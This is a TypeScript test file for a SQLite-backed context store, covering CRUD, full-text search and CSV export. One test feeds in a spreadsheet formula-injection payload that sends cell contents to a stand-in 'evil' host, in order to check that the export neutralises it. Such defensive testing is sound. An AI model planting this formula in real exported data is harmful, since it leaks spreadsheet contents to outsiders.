/**
 * Memory spine — repository CRUD + FTS5 search tests.
 */

import { mkdtempSync, rmSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { openContextDb, resetContextDbCache } from "../../src/context/db.js";
import { ensureContextSchema } from "../../src/context/migrations.js";
import {
  insertDocument,
  insertChunksForDocument,
  insertClaim,
  listClaims,
  searchChunks,
  setClaimStatus,
  status,
  upsertProject,
  upsertFileIndex,
  upsertSessionLog,
  latestSession,
} from "../../src/context/repository.js";
import { exportCsv } from "../../src/context/export_csv.js";

let tmpHome: string;
const origHarnessHome = process.env.PATCHWORK_HARNESS_HOME;

beforeEach(() => {
  tmpHome = mkdtempSync(join(tmpdir(), "patchwork-harness-ctx-repo-"));
  process.env.PATCHWORK_HARNESS_HOME = tmpHome;
  resetContextDbCache();
});
afterEach(() => {
  resetContextDbCache();
  if (origHarnessHome === undefined) delete process.env.PATCHWORK_HARNESS_HOME;
  else process.env.PATCHWORK_HARNESS_HOME = origHarnessHome;
  try { rmSync(tmpHome, { recursive: true, force: true }); } catch { /* */ }
});

describe("repository CRUD", () => {
  it("inserts a project and finds it by name (upsert is idempotent)", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    const a = upsertProject(db, { name: "patchwork-harness", language: "TypeScript" });
    const b = upsertProject(db, { name: "patchwork-harness", notes: "second touch" });
    expect(a.id).toBe(b.id);
    expect(b.language).toBe("TypeScript"); // COALESCE preserved
    expect(b.notes).toBe("second touch");
  });

  it("inserts a document and chunks; FTS5 retrieves the chunk", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    const doc = insertDocument(db, {
      uri: "manual://smoke",
      title: "smoke test",
      source_type: "note",
    });
    const chunks = insertChunksForDocument(db, doc.id, [
      "HARNESS stores durable context in SQLite FTS5.",
      "Provenance is tracked on every claim.",
    ]);
    expect(chunks.length).toBe(2);

    const hits = searchChunks(db, "durable context", { limit: 5 });
    expect(hits.length).toBeGreaterThan(0);
    expect(hits[0].text).toContain("durable context");
    expect(hits[0].document_id).toBe(doc.id);
  });

  it("inserts a claim with provenance + reads back exact fields", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    const claim = insertClaim(db, {
      statement: "Patchwork Harness uses better-sqlite3.",
      created_by: "model:opus-4-7",
      confidence: 0.95,
      status: "supported",
      evidence_uri: "DECISIONS/0009-memory-spine-direction.md",
    });
    expect(claim.statement).toContain("better-sqlite3");
    expect(claim.created_by).toBe("model:opus-4-7");
    expect(claim.confidence).toBeCloseTo(0.95);
    expect(claim.status).toBe("supported");
  });

  it("status enum is enforced by CHECK constraint", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    expect(() =>
      insertClaim(db, {
        statement: "bad status",
        created_by: "user",
        // @ts-expect-error — deliberately invalid to test runtime guard
        status: "bogus",
      }),
    ).toThrow();
  });

  it("confidence outside [0,1] is rejected by zod", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    expect(() =>
      insertClaim(db, {
        statement: "out of range",
        created_by: "user",
        confidence: 1.5,
      }),
    ).toThrow();
  });

  it("depends_on serialises to JSON for cascade tracking", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    const parent = insertClaim(db, { statement: "parent", created_by: "user" });
    const child = insertClaim(db, {
      statement: "child",
      created_by: "user",
      depends_on: [parent.id],
    });
    expect(child.depends_on_json).toBe(JSON.stringify([parent.id]));
  });

  it("setClaimStatus updates status + last_verified_at", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    const c = insertClaim(db, { statement: "to verify", created_by: "user" });
    const updated = setClaimStatus(db, c.id, "supported");
    expect(updated?.status).toBe("supported");
    expect(updated?.last_verified_at).toBeTruthy();
  });

  it("listClaims filters by status", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    insertClaim(db, { statement: "a", created_by: "user", status: "unverified" });
    insertClaim(db, { statement: "b", created_by: "user", status: "supported" });
    insertClaim(db, { statement: "c", created_by: "user", status: "supported" });
    const supported = listClaims(db, { status: "supported" });
    expect(supported.length).toBe(2);
  });

  it("upserts file_index without duplicating", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    const p = upsertProject(db, { name: "p" });
    const a = upsertFileIndex(db, { project_id: p.id, path: "src/foo.ts", language: "TypeScript" });
    const b = upsertFileIndex(db, { project_id: p.id, path: "src/foo.ts", one_line_summary: "the foo" });
    expect(a.id).toBe(b.id);
    expect(b.language).toBe("TypeScript");
    expect(b.one_line_summary).toBe("the foo");
  });

  it("sessions_log upsert + latestSession", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    upsertSessionLog(db, { session_id: "s1", started_at: "2026-05-27T10:00:00Z" });
    upsertSessionLog(db, { session_id: "s2", started_at: "2026-05-27T11:00:00Z", next_action: "ship phase 1" });
    const latest = latestSession(db);
    expect(latest?.session_id).toBe("s2");
    expect(latest?.next_action).toBe("ship phase 1");
  });

  it("status() reports counts and schema version", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    upsertProject(db, { name: "x" });
    insertClaim(db, { statement: "y", created_by: "user", status: "supported" });
    const s = status(db, "/tmp/whatever.db");
    expect(s.schema_version).toBe(1);
    expect(s.counts.projects).toBe(1);
    expect(s.counts.claims).toBe(1);
    expect(s.claims_by_status.supported).toBe(1);
  });

  it("CSV export neutralises formula-injection (cells starting with =+-@) (post-audit)", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    // Attacker-controllable claim text starting with '='
    insertClaim(db, {
      statement: "=HYPERLINK(\"http://evil/?x=\"&A1,\"go\")",
      created_by: "model:opus-4-7",
      status: "supported",
    });
    const result = exportCsv(db, join(tmpHome, "csv-inject"));
    const claimsCsv = result.files.find((f) => f.table === "claims");
    expect(claimsCsv).toBeDefined();
    const text = require("node:fs").readFileSync(claimsCsv!.path, "utf8");
    // The dangerous cell must be wrapped in quotes AND prefixed with '
    expect(text).toMatch(/"'=HYPERLINK/);
  });

  it("export-csv writes one file per table", () => {
    const db = openContextDb({ fresh: true });
    ensureContextSchema(db);
    upsertProject(db, { name: "x" });
    const result = exportCsv(db, join(tmpHome, "csv-out"));
    expect(result.files.length).toBe(6);
    for (const f of result.files) expect(existsSync(f.path)).toBe(true);
    const projectsFile = result.files.find((f) => f.table === "projects");
    expect(projectsFile?.rows).toBe(1);
  });
});
